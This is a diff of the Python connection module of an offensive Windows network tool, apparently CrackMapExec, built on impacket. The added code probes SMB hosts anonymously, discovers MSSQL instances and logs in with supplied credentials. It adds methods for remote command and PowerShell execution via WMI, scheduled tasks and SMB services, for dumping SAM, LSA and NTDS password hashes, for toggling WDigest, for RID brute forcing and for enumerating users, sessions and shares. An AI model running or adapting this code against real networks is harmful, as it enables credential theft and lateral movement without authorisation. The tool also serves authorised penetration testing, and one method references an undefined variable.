@@ -1,40 +1,179 @@
 import logging
+import socket
+from logging import getLogger
 from traceback import format_exc
-from helpers import highlight
+from StringIO import StringIO
+from functools import wraps
+from gevent.coros import BoundedSemaphore
+from impacket.smbconnection import SMBConnection, SessionError
+from impacket.nmb import NetBIOSError
+from impacket import tds
+from cme.mssql import *
+from impacket.dcerpc.v5.rpcrt import DCERPCException
+from cme.helpers import highlight, create_ps_command
+from cme.logger import CMEAdapter
+from cme.context import Context
+from cme.enum.shares import ShareEnum
+from cme.enum.uac import UAC
+from cme.enum.rpcquery import RPCQUERY
+from cme.enum.passpol import PassPolDump
+from cme.enum.users import SAMRDump
+from cme.enum.wmiquery import WMIQUERY
+from cme.enum.lookupsid import LSALookupSid
+from cme.credentials.secretsdump import DumpSecrets
+from cme.credentials.wdigest import WDIGEST
+from cme.spider.smbspider import SMBSpider
 from cme.execmethods.mssqlexec import MSSQLEXEC
 from cme.execmethods.wmiexec import WMIEXEC
 from cme.execmethods.smbexec import SMBEXEC
 from cme.execmethods.atexec import TSCH_EXEC
 from impacket.dcerpc.v5 import transport, scmr
-from impacket.dcerpc.v5.rpcrt import DCERPCException
-from impacket.smbconnection import SessionError
-from gevent.coros import BoundedSemaphore
 
 sem = BoundedSemaphore(1)
 global_failed_logins = 0
 user_failed_logins = {}
 
+def requires_admin(func):
+    def _decorator(self, *args, **kwargs):
+        if self.admin_privs is False: return
+        return func(self, *args, **kwargs)
+    return wraps(func)(_decorator)
+
 class Connection:
 
-    def __init__(self, args, db, target, server_name, domain, conn, logger, cmeserver):
+    def __init__(self, args, db, host, module, cmeserver):
         self.args = args
         self.db = db
-        self.host = target
-        self.hostname = server_name
-        self.domain = domain
-        self.conn = conn
-        self.logger = logger
+        self.host = host
+        self.module = module
         self.cmeserver = cmeserver
+        self.conn = None
+        self.hostname = None
+        self.domain = None
+        self.server_os = None
+        self.logger = None
         self.password = None
         self.username = None
         self.hash = None
         self.admin_privs = False
         self.failed_logins = 0
+        
+        try:
+            smb = SMBConnection(self.host, self.host, None, self.args.smb_port)
 
-        if self.args.local_auth:
-            self.domain = self.hostname
+            #Get our IP from the socket
+            local_ip = smb.getSMBServer().get_socket().getsockname()[0]
 
-        self.login()
+            #Get the remote ip address (in case the target is a hostname) 
+            remote_ip = smb.getRemoteHost()
+
+            try:
+                smb.login('' , '')
+            except SessionError as e:
+                if "STATUS_ACCESS_DENIED" in e.message:
+                    pass
+
+            self.host = remote_ip
+            self.domain   = smb.getServerDomain()
+            self.hostname = smb.getServerName()
+            self.server_os = smb.getServerOS()
+
+            if not self.domain:
+                self.domain = self.hostname
+
+            self.db.add_host(self.host, self.hostname, self.domain, self.server_os)
+
+            self.logger = CMEAdapter(getLogger('CME'), {
+                                                        'host': self.host, 
+                                                        'port': self.args.smb_port,
+                                                        'hostname': u'{}'.format(self.hostname)
+                                                       })
+
+            self.logger.info(u"{} (name:{}) (domain:{})".format(
+                                                                self.server_os,
+                                                                self.hostname.decode('utf-8'), 
+                                                                self.domain.decode('utf-8')
+                                                                ))
+
+            try:
+                '''
+                    DC's seem to want us to logoff first
+                    Windows workstations sometimes reset the connection, so we handle both cases here
+                    (go home Windows, you're drunk)
+                '''
+                smb.logoff()
+            except NetBIOSError:
+                pass
+            except socket.error:
+                pass
+
+            if self.args.mssql:
+                instances = None
+                self.logger.extra['port'] = self.args.mssql_port
+
+                mssql = tds.MSSQL(self.host, self.args.mssql_port, self.logger)
+                mssql.connect()
+
+                instances = mssql.getInstances(10)
+                if len(instances) > 0:
+                    self.logger.info("Found {} MSSQL instance(s)".format(len(instances)))
+                    for i, instance in enumerate(instances):
+                        self.logger.highlight("Instance {}".format(i))
+                        for key in instance.keys():
+                            self.logger.highlight(key + ":" + instance[key])
+
+                try:
+                    mssql.disconnect()
+                except:
+                    pass
+
+            if (self.args.username and (self.args.password or self.args.hash)) or self.args.cred_id:
+                
+                if self.args.mssql and (instances is not None and len(instances) > 0):
+                    self.conn = tds.MSSQL(self.host, self.args.mssql_port, self.logger)
+                    self.conn.connect()
+                
+                elif not args.mssql:
+                    self.conn = SMBConnection(self.host, self.host, None, self.args.smb_port)
+
+        except socket.error:
+            pass
+
+        if self.conn:
+            if self.args.domain:
+                self.domain = self.args.domain
+
+            if self.args.local_auth:
+                self.domain = self.hostname
+
+            self.login()
+
+            if ((self.password is not None or self.hash is not None) and self.username is not None):
+
+                if self.module:
+                    module_logger = CMEAdapter(getLogger('CME'), {
+                                                                  'module': module.name.upper(), 
+                                                                  'host': self.host, 
+                                                                  'port': self.args.smb_port, 
+                                                                  'hostname': self.hostname
+                                                                 })
+                    context = Context(self.db, module_logger, self.args)
+                    context.localip  = local_ip
+
+                    if hasattr(module, 'on_request') or hasattr(module, 'has_response'):
+                        cmeserver.server.context.localip = local_ip
+
+                    if hasattr(module, 'on_login'):
+                        module.on_login(context, self)
+
+                    if hasattr(module, 'on_admin_login') and self.admin_privs:
+                        module.on_admin_login(context, self)
+
+                elif self.module is None:
+                    for k, v in vars(self.args).iteritems():
+                        if hasattr(self, k) and hasattr(getattr(self, k), '__call__'):
+                            if v is not False and v is not None:
+                                getattr(self, k)()
 
     def over_fail_limit(self, username):
         global global_failed_logins
@@ -276,9 +415,14 @@ class Connection:
                                             if self.plaintext_login(self.domain, user, f_pass.strip()): return
                                     password.seek(0)
 
-    def execute(self, payload, get_output=False, methods=None):
+    @requires_admin
+    def execute(self, payload=None, get_output=False, methods=None):
 
         default_methods = ['wmiexec', 'atexec', 'smbexec']
+
+        if not payload and self.args.execute: 
+            payload = self.args.execute
+            if not self.args.no_output: get_output = True
 
         if self.args.mssql:
             exec_method = MSSQLEXEC(self.conn)
@@ -330,6 +474,76 @@ class Connection:
             if hasattr(self.cmeserver.server.module, 'on_request') or hasattr(self.cmeserver.server.module, 'on_response'):
                 self.cmeserver.server.hosts.append(self.host)
 
-        output = exec_method.execute(payload, get_output)
+        output = u'{}'.format(exec_method.execute(payload, get_output).strip().decode('utf-8'))
 
-        return u'{}'.format(output.strip().decode('utf-8'))
+        if self.args.execute or self.args.ps_execute:
+            self.logger.success('Executed command {}'.format('via {}'.format(self.args.exec_method) if self.args.exec_method else ''))
+            buf = StringIO(output).readlines()
+            for line in buf:
+                self.logger.highlight(line.strip())
+
+        return output
+
+    @requires_admin
+    def ps_execute(self, payload=None, get_output=False, methods=None):
+        if not payload and self.args.ps_execute:
+            payload = self.args.ps_execute
+            if not self.args.no_output: get_output = True
+
+        return self.execute(create_ps_command(payload), get_output, methods)
+
+    @requires_admin
+    def sam(self):
+        return DumpSecrets(self).SAM_dump()
+
+    @requires_admin
+    def lsa(self):
+        return DumpSecrets(self).LSA_dump()
+
+    @requires_admin
+    def ntds(self):
+        return DumpSecrets(self).NTDS_dump()
+
+    @requires_admin
+    def wdigest(self):
+        return getattr(WDIGEST(self), self.args.wdigest)()
+
+    def shares(self):
+        return ShareEnum(self).enum()
+
+    @requires_admin
+    def uac(self):
+        return UAC(self).enum()
+
+    def sessions(self):
+        return RPCQUERY(self).enum_sessions()
+
+    def disks(self):
+        return RPCQUERY(self).enum_disks()
+
+    def users(self):
+        return SAMRDump(self).enum()
+
+    def rid_brute(self):
+        return LSALookupSid(self).brute_force()
+
+    def pass_pol(self):
+        return PassPolDump(self).enum()
+
+    def lusers(self):
+        return RPCQUERY(self).enum_lusers()
+
+    @requires_admin
+    def wmi(self):
+        return WMIQUERY(self).query()
+
+    def spider(self):
+        spider = SMBSpider(self)
+        spider.spider(self.args.spider, self.args.depth)
+        spider.finish()
+
+        return spider.results
+
+    def mssql_query(self):
+        self.conn.sql_query(self.args.mssql_query)
+        return conn.printRows()
